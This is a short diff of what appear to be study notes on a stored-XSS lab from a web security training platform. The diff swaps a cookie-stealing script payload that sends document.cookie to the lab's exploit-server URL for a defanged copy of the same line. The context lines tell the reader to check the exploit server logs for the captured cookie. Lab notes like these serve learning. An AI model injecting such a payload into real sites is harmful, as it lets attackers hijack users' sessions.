@@ -670,8 +670,7 @@ Success for stored XSS
 
 Go to Exploit Server and copy exploit server link excluding 'exploit'
 Place it in a script tag and when someone clicks the "view post" section their cookie should be revealed which can be decoded
-
-<.script>document.location='https://exploit-ac681fd91ffd6f2dc0490d9a01ca0039.web-security-academy.net/'+document.cookie</script>
+.script.document.location='https://exploit-ac681fd91ffd6f2dc0490d9a01ca0039.web-security-academy.net/'+document.cookie.script.
 
 Go back to exploit server and check the logs
 
